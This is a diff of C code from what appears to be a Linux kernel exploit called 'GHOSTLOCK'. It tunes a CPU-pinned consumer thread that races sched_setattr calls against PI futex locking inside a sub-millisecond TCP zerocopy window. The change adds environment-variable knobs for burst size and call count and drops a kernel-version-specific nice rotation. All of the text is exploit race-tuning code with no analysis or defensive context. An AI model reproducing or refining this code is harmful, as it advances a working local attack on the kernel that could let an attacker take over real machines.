@@ -276,6 +276,12 @@ void *consumer_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
   pin_to_core(CONSUMER_CORE);
   pr_info("consumer thread running on cpu=%d\n", sched_getcpu());
+  /* calls per armed window; >1 gets more PI-walk tickets inside the tcp
+   * zerocopy window, which is sub-millisecond */
+  int max_calls = env_int("GHOSTLOCK_CONSUMER_MAX_CALLS", CONSUMER_MAX_CALLS,
+                          1, 64);
+  int burst = env_int("GHOSTLOCK_CONSUMER_BURST", PSELECT_CONSUMER_BURST_CALLS,
+                      1, 64);
   int seen = 0;
   while (!atomic_load(&punch_consume_stop)) {
     int seq = atomic_load(&punch_consume_go);
@@ -290,21 +296,17 @@ void *consumer_thread(void *arg __attribute__((unused))) {
            atomic_load(&punch_consume_go) == seq) {
       int delay_usec = atomic_load(&main_route_delay_usec);
       if (delay_usec > 0) usleep((useconds_t)delay_usec);
-      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
+      for (int b = 0; b < burst; b++) {
         if (atomic_load(&punch_consume_stop) ||
             atomic_load(&punch_consume_go) != seq) break;
         atomic_fetch_add(&consumer_calls, 1);
         atomic_store(&consumer_inflight, 1);
         errno = 0;
-        /* rotate the nice every call; (calls%19)+1 is what makes
-         * sched_setattr succeed on 6.1 compact */
-        int consumer_nice = (active_offsets && active_offsets->compact_waiter)
-                                ? (calls_this_seq % 19) + 1
-                                : PSELECT_CONSUMER_NICE;
-        long sched_ret = sched_setattr_tid(tid, consumer_nice);
+        long sched_ret = sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
         int setattr_errno = errno;
         pr_info("consumer call tid=%d nice=%d ret=%ld errno=%d\n",
-                tid, consumer_nice, sched_ret, sched_ret ? setattr_errno : 0);
+                tid, PSELECT_CONSUMER_NICE, sched_ret,
+                sched_ret ? setattr_errno : 0);
         if (sched_ret != 0) {
           struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
           long fret = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
@@ -318,7 +320,7 @@ void *consumer_thread(void *arg __attribute__((unused))) {
         if (sched_ret == 0) atomic_fetch_add(&consumer_success, 1);
         atomic_store(&consumer_inflight, 0);
         calls_this_seq++;
-        if (calls_this_seq >= CONSUMER_MAX_CALLS) {
+        if (calls_this_seq >= max_calls) {
           atomic_store(&punch_consume_go, 0);
           break;
         }
